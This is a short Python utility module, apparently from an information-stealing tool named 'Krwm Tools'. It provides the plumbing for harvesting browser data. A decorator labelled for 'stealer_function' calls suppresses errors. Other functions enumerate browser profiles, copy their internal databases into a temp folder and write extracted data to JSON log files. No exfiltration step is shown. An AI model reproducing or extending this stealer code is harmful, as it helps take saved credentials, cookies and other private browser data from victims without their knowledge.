""" IMPORTS """
import os
import json
from shutil import copyfile

""" CONSTANTS """
# Directory paths
KRWM_DIR = os.path.expanduser('~/Documents/Krwm Tools')
TEMP_PATH = KRWM_DIR + '/Client Temp'
LOGS_PATH = KRWM_DIR + '/Client Logs'

# Encode / decode format
FORMAT = 'utf-8'


def try_extract(stealer_function):
    """ Decorator function which ignores Exceptions when calling stealer_function """
    def wrapper(*args, **kwargs):
        try:
            # Try calling stealer_function
            stealer_function(*args, **kwargs)
        except Exception as e:
            # Ignore any Exceptions
            print(e)

    return wrapper


def mkdir_if_not_exists(path: str) -> None:
    """ Creates a directory at path if it does not exist yet """
    if not os.path.exists(path):
        os.mkdir(path)


def get_profiles(browser: dict) -> list[str]:
    """ Returns a list of profiles for a browser if supported """
    # Browser does not support multiple profiles
    if not browser['has_profiles']:
        return ['']

    # Find all profiles
    profiles = []
    for subdir_name in os.listdir(browser['path']):
        if subdir_name == 'Default' or subdir_name.startswith('Profile'):
            profiles.append(subdir_name)
    return profiles


def create_temp_file(browser: dict, profile_name: str, db_name: str) -> str:
    """
    Creates a copy of the specified database name in a browser's profile directory
    into the TEMP directory and returns the path to this copy
    """
    original_path = f"{browser['path']}/{profile_name}/{db_name}"
    temp_name = f"{browser['name']} {profile_name} {db_name}"
    temp_path = f"{TEMP_PATH}/{temp_name}"
    copyfile(original_path, temp_path)
    return temp_path


def log_data(data: dict or list, browser_name: str, file_name: str) -> None:
    """ Creates a log_data file with specified file name for some JSON-serializable data """
    log_path = f'{LOGS_PATH}/{browser_name}/{file_name}.json'
    with open(log_path, 'w') as f:
        json.dump(data, f, indent=4)
